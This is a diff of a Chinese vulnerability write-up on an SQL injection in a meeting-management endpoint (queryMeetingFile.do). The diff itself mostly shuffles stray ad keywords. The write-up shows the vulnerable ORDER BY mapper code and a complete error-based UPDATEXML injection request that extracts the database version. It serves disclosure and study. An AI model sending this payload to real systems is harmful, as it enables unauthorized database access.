@@ -20,14 +20,6 @@ V1.6.x
 
 # 漏洞分析
 
-深入探索
-
-安全硬件设备
-
-Windows安全工具
-
-网络安全培训
-
 直接看 `MobiMeetingAppController` 里关于 `queryMeetingFile` 的实现
 
 ```
@@ -60,9 +52,17 @@ public MethodResult queryMeetingFile(@RequestParam(required = true,value = "mtId
             List<MeetingFile> list = this.meetingAsm.queryMeetingFile(param);
 ```
 
+深入探索
+
+客户关系管理
+
+数据管理
+
+网络安全
+
 和 [汉王e脸通综合管理平台 queryManyPeopleGroupList.do SQL注入漏洞](https://mrxn.net/jswz/hanvon-efacego-queryManyPeopleGroupList-sqli.html) 处理逻辑差不多，直接看对应的 mapper xml文件 MeetingFileDsm.xml
 
-漏洞扫描服务
+软件
 
 ```
 <!--查询会议附件列表(按照会议ID查询)-->
@@ -80,14 +80,6 @@ public MethodResult queryMeetingFile(@RequestParam(required = true,value = "mtId
   </select>
 ```
 
-深入探索
-
-Web安全课程
-
-防火墙软件
-
-服务器安全加固服务
-
 用户可控的 `columnKey` 和 `order` 参数未经任何过滤直接拼接到 SQL 语句的 `ORDER BY` 子句中，导致攻击者可构造恶意输入执行任意 SQL 命令，造成[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。
 
 # 漏洞复现
@@ -96,7 +88,7 @@ Web安全课程
 >
 > 需要 mtId 参数存在
 >
-> 软件
+> 计算机安全
 
 ```
 GET /manage/mobiMeetingApp/queryMeetingFile.do?begin=&branchId=1&end=&page=1&pageSize=10&year=2025&mtId=1&order=(UPDATEXML(2920,CONCAT(0x7e,@@version,0x7e,(SELECT+(ELT(2920=2920,1)))),8357)) HTTP/1.1
@@ -108,4 +100,4 @@ token: xxxxxxxxxxxxxxxx
 
 成功利用报错注入获取到数据版本号
 
-安全运维服务
+数据管理
